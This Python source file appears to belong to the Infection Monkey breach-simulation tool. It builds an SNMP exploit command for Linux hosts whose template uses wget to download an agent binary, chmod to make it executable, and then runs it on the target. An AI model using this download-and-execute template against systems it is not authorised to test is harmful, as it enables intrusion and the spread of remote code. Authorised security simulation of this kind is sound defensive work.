from typing import Sequence

from common import OperatingSystem
from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from common.types import AgentID
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import TargetHost
from infection_monkey.model import MONKEY_ARG
from infection_monkey.utils.commands import build_monkey_commandline

SNMP_LINUX_COMMAND_TEMPLATE = (
    "wget -O %(monkey_path)s %(http_path)s "
    "; chmod +x %(monkey_path)s "
    "; %(agent_otp_environment_variable)s=%(agent_otp)s "
    "%(monkey_path)s %(monkey_type)s %(parameters)s"
)


def build_snmp_command(
    agent_id: AgentID,
    target_host: TargetHost,
    servers: Sequence[str],
    current_depth: int,
    agent_download_url: str,
    otp: str,
) -> str:
    if target_host.operating_system == OperatingSystem.WINDOWS:
        raise Exception(f"Unsupported operating system: {target_host.operating_system}")

    monkey_cmd = build_monkey_commandline(agent_id, servers, current_depth + 1)

    command = SNMP_LINUX_COMMAND_TEMPLATE % {
        "monkey_path": get_agent_dst_path(target_host),
        "http_path": agent_download_url,
        "monkey_type": MONKEY_ARG,
        "parameters": monkey_cmd,
        "agent_otp_environment_variable": AGENT_OTP_ENVIRONMENT_VARIABLE,
        "agent_otp": otp,
    }
    return f'-c "{command}"'
